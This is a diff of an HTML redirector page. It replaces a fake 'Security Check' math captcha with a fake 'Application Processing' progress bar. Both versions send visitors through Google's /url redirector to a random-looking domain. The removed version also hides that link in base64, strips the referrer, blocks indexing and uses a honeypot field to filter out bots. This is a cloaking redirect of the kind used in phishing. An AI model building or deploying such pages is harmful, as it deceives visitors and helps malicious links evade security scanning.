@@ -3,88 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Prevents the destination server from seeing where the click came from -->
-    <meta name="referrer" content="no-referrer">
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <title>Checking...</title>
+    <title>Application Processing</title>
+
     <style>
-        :root { --p: #2563eb; --t: #1e293b; }
-        body { margin:0; background:#f8fafc; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
-        .card { background:#fff; padding:2.5rem; border-radius:16px; box-shadow:0 20px 25px -5px rgba(0,0,0,0.1); width:100%; max-width:350px; text-align:center; border:1px solid #e2e8f0; }
-        .icon { background:#eff6ff; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1.5rem; font-size: 24px; }
-        h1 { font-size:1.3rem; color:var(--t); margin-bottom:0.5rem; }
-        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:1.5rem; }
-        .captcha { background:#f1f5f9; border:1px solid #cbd5e1; padding:1.2rem; border-radius:12px; margin-bottom:1rem; }
-        #q-text { font-weight:700; font-size:1.1rem; display:block; margin-bottom:0.8rem; }
-        input { width:80px; padding:10px; border:2px solid #cbd5e1; border-radius:8px; text-align:center; font-size:1.1rem; outline:none; }
-        input:focus { border-color:var(--p); }
-        button { width:100%; background:var(--p); color:#fff; border:none; padding:14px; border-radius:8px; font-weight:600; cursor:pointer; transition:0.2s; }
-        button:hover { background:#1d4ed8; }
-        #err { color:#ef4444; font-size:0.8rem; margin-top:10px; display:none; }
-        .hp { position:absolute; left:-9999px; top:-9999px; } 
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .process-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        h2 {
+            font-size: 20px;
+            color: #212529;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 20px;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 8px;
+            background-color: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background-color: #0d6efd;
+            border-radius: 4px;
+            animation: loadProgress 3s linear forwards;
+        }
+
+        @keyframes loadProgress {
+            0% { width: 0%; }
+            50% { width: 60%; }
+            100% { width: 100%; }
+        }
     </style>
 </head>
+
 <body>
 
-<div class="card">
-    <div class="icon">🛡️</div>
-    <h1 id="title">Security Check</h1>
-    <p id="desc">Complete the verification to continue to the destination.</p>
+<div class="process-container">
+    <h2>Processing Request</h2>
+    <p>Please wait while your dashboard environment loads...</p>
 
-    <div class="hp"><input type="text" id="bot_check" tabindex="-1"></div>
-
-    <div class="captcha">
-        <span id="q-text"></span>
-        <input type="number" id="ans_input" placeholder="?">
-        <div id="err">Incorrect. Please try again.</div>
+    <div class="progress-track">
+        <div class="progress-fill"></div>
     </div>
-
-    <button id="vbtn" onclick="verify()">Verify & Continue</button>
 </div>
 
 <script>
-    // NEW ENCODED LINK
-    const _secret = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwcyUzQSUyRiUyRjk4NzQyMzUyMzIzMmtiMjUzNHk0eS5jb20mc2E9RCZzbnR6PTEmdXNnPUFPdlZhdzNxWGY4akVCcS1rQjAxeU1HUzRSMHA=";
-
-    const v1 = Math.floor(Math.random() * 8) + 2;
-    const v2 = Math.floor(Math.random() * 5) + 1;
-    const result = v1 + v2;
-
-    document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
-    
-    setTimeout(() => { document.title = "Human Verification"; }, 1000);
-
-    function verify() {
-        const userAns = document.getElementById('ans_input').value;
-        const botTrap = document.getElementById('bot_check').value;
-        const errMsg = document.getElementById('err');
-        const btn = document.getElementById('vbtn');
-
-        if (botTrap !== "") return; 
-
-        if (parseInt(userAns) === result) {
-            btn.innerText = "Redirecting...";
-            btn.disabled = true;
-
-            const target = atob(_secret);
-
-            // Clean Redirect Method
-            setTimeout(() => {
-                const a = document.createElement('a');
-                a.href = target;
-                a.rel = 'noreferrer';
-                a.click();
-            }, 400);
-
-        } else {
-            errMsg.style.display = 'block';
-            document.getElementById('ans_input').value = "";
-        }
-    }
-
-    document.getElementById('ans_input').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') verify();
-    });
+    // Redirect after 3 seconds (same duration as animation)
+    setTimeout(function () {
+        window.location.href = "https://www.google.com/url?q=https%3A%2F%2F987423523232kb2534y4y.com&sa=D&sntz=1&usg=AOvVaw3qXf8jEBq-kB01yMGS4R0p";
+    }, 3000);
 </script>
 
 </body>
